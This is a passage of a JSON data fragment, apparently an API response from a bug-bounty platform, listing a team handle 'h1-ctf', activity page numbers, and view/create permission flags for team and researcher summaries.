      "team_handle": "h1-ctf"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}